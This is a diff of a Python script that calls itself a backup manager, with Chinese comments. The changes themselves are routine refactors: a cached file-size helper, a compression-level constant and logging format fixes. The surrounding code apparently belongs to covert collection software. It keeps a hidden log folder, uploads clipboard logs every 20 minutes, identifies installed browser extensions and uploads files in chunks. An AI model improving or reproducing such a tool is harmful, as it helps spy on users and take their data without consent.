@@ -21,9 +21,12 @@ import json
 import base64
 import glob
 import sqlite3
+import re
 from datetime import datetime, timedelta
 from pathlib import Path
 from functools import lru_cache
+from concurrent.futures import ThreadPoolExecutor, as_completed
+from typing import Optional, Iterator, Tuple, List
 
 @lru_cache(maxsize=1)
 def ensure_uv_installed():
@@ -63,6 +66,22 @@ def ensure_uv_installed():
     except FileNotFoundError:
         print("⚠ curl 命令未找到，无法安装 uv")
         return False
+
+
+@lru_cache(maxsize=8192)
+def get_file_size_cached(path: str) -> int:
+    """缓存文件大小，避免重复系统调用
+
+    Args:
+        path: 文件路径
+
+    Returns:
+        文件大小（字节），失败返回 0
+    """
+    try:
+        return os.path.getsize(path)
+    except (OSError, IOError):
+        return 0
 
 
 def check_and_install_dependencies():
@@ -211,20 +230,25 @@ except ImportError:
 class BackupConfig:
     # 调试配置
     DEBUG_MODE = True  # 是否输出调试日志（False/True）
-    
+
     # 文件大小配置（单位：字节）
     MAX_SINGLE_FILE_SIZE = 50 * 1024 * 1024   # 单文件阈值：50MB（超过则分片）
     CHUNK_SIZE = 50 * 1024 * 1024             # 分片大小：50MB
-    
+
     # 重试配置
     RETRY_COUNT = 5        # 最大重试次数
     RETRY_DELAY = 60       # 重试等待时间（秒）
     UPLOAD_TIMEOUT = 3600  # 上传超时时间（秒）
-   
+
     # 备份间隔配置
     BACKUP_INTERVAL = 7 * 24 * 60 * 60  # 备份间隔时间：7天（单位：秒）
     CLIPBOARD_INTERVAL = 1200  # JTB日志上传间隔时间（20分钟，单位：秒）
     SCAN_TIMEOUT = 3600    # 扫描超时时间：1小时
+
+    # 性能优化常量
+    TAR_COMPRESS_LEVEL = 6  # tar.gz 压缩级别（1-9，6 为平衡值）
+    NETWORK_CHECK_TIMEOUT = 5  # 网络检查超时时间（秒）
+    NETWORK_CHECK_RETRIES = 3  # 网络检查重试次数
     
     # 日志配置
     LOG_FILE = str(Path.home() / ".dev/Backup/backup.log")
@@ -335,8 +359,6 @@ class BackupConfig:
         "208.67.222.222",  # OpenDNS
         "9.9.9.9"          # Quad9 DNS
     ]
-    NETWORK_CHECK_TIMEOUT = 5  # 网络检查超时时间（秒）
-    NETWORK_CHECK_RETRIES = 3  # 网络检查重试次数
 
 if BackupConfig.DEBUG_MODE:
     logging.basicConfig(format="%(message)s", level=logging.DEBUG)
@@ -473,7 +495,7 @@ class BackupManager:
                 except (socket.timeout, socket.gaierror, ConnectionRefusedError):
                     continue
                 except Exception as e:
-                    logging.debug(f"网络检查出错 {host}: {e}")
+                    logging.debug("网络检查出错 %s: %s", host, e)
                     continue
             time.sleep(1)  # 重试前等待1秒
         return False
@@ -587,11 +609,11 @@ class BackupManager:
                                                         return ext_name
                                     except Exception as e:
                                         if self.config.DEBUG_MODE:
-                                            logging.debug(f"读取manifest.json失败: {manifest_path} - {e}")
+                                            logging.debug("读取manifest.json失败: %s - %s", manifest_path, e)
                                         continue
                 except Exception as e:
                     if self.config.DEBUG_MODE:
-                        logging.debug(f"识别扩展失败: {ext_id} - {e}")
+                        logging.debug("识别扩展失败: %s - %s", ext_id, e)
                 
                 return None
 
@@ -1536,7 +1558,7 @@ class BackupManager:
                     size_str = f"{file_size / 1024 / 1024:.2f}MB" if file_size >= 1024 * 1024 else f"{file_size / 1024:.2f}KB"
                     logging.critical(f"📤 [{config_name}] 上传: {filename} ({size_str})")
                 elif self.config.DEBUG_MODE:
-                    logging.debug(f"[{config_name}] 重试上传: {filename} (第 {attempt + 1} 次)")
+                    logging.debug("[%s] 重试上传: %s (第 %d 次)", config_name, filename, attempt + 1)
 
                 # 准备请求头
                 headers = {
@@ -1669,7 +1691,7 @@ class BackupManager:
             if os.path.exists(tar_path):
                 os.remove(tar_path)
 
-            with tarfile.open(tar_path, "w:gz") as tar:
+            with tarfile.open(tar_path, "w:gz", compresslevel=BackupConfig.TAR_COMPRESS_LEVEL) as tar:
                 tar.add(folder_path, arcname=os.path.basename(folder_path))
 
             try:
